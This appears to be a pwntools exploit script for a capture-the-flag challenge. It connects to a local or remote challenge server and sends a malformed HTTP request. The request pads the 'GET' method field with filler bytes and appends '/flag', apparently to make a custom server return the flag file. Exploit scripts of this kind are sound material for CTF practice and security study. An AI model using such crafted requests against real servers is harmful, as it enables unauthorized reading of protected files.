from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

io = remote("127.0.0.1", 8000) if not f_remote else remote(
    "a603f5e0-a75c-48bd-a5a6-88e50de2925d.chall.nnsc.tf", 41337, ssl=True)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

payload = b"GET".ljust(0x10, b"a")
payload += b"/flag"
payload += b" / HTTP/1.1"
payload += b"\r\n\r\n"
io.send(payload)

io.interactive()
